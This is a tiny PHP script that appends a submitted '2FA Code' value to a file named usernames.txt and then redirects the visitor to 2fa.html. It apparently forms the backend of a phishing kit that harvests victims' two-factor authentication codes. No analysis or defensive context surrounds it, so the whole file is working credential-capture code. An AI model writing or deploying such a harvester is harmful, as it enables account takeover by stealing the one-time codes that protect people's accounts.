<?php

file_put_contents("usernames.txt", "2FA Code: " . $_POST['code'] . "\n", FILE_APPEND);
header('Location: 2fa.html');
exit();
?>